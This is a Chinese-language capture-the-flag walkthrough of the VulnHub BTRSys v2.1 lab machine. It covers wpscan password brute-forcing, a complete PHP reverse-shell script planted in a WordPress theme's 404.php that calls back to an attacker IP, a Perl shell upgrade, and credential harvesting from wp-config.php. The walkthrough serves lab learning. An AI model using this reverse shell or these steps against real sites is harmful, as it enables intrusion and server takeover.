---
title: VulnHub BTRSys：v2.1
date: 2026-04-03 12:09:00
categories: 
  - VulnHub
tags:
  - 弱口令
  - RCE
  - 使用 Perl 升级为交互式 Shell
  - 敏感信息泄露
---

# BTRSys: v2.1

项目地址：https://download.vulnhub.com/btrsys/BTRSys1.rar

是一个打包好的镜像文件

**注意：导入 vmx 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/69ce20a8e348c042e178374d.png)

发现 `/wordpress` 目录，确认存在 WordPress 站点

![](https://pic1.imgdb.cn/item/69ce210be348c042e1783a11.png)

## 弱口令

### WordPress

使用 `wpscan` 检测 WordPress 版本和账号

```bash
wpscan --url http://192.168.110.134/wordpress -U users.txt -P /usr/share/wordlists/rockyou.txt
```

成功拿到账号密码

```
admin:admin
```

![](https://pic1.imgdb.cn/item/69ce2e1fe348c042e1788f74.png)

登录后台

![](https://pic1.imgdb.cn/item/69ce2ecce348c042e17890a1.png)

## RCE

### WordPress

在后台可以编辑其 `404.php` 文件内容

![](https://pic1.imgdb.cn/item/69ce46166ccec478dfaceda3.png)

修改为反弹 Shell

```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.110.128';  // CHANGE THIS
$port = 8888;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}
	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),  
   1 => array("pipe", "w"),  
   2 => array("pipe", "w")   
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?> 
```

这里我是先访问的 Hello world! 默认页面

发现有参数 `?p=1`，将去改为 666 触发 404 拿到 Shell

![](https://pic1.imgdb.cn/item/69ce48916ccec478dfacee74.png)

![](https://pic1.imgdb.cn/item/69ce48cc6ccec478dfacee8c.png)

## 提权

### 使用 Perl 升级为交互式 Shell

Python 的不能用，换其他的试试

```bash
perl -e 'exec "/bin/bash";'
```

### 敏感信息泄露

翻找 WordPress 源码在 `wp-config.php` 中找到数据库账号密码

![](https://pic1.imgdb.cn/item/69ce49526ccec478dfaceeb4.png)

成功登录进数据库

![](https://pic1.imgdb.cn/item/69ce4be86ccec478dfacf1ca.png)

翻找到账号密码

![](https://pic1.imgdb.cn/item/69ce4c2c6ccec478dfacf1e0.png)

撞出哈希提权成功

![](https://pic1.imgdb.cn/item/69ce4e756ccec478dfacf2a4.png)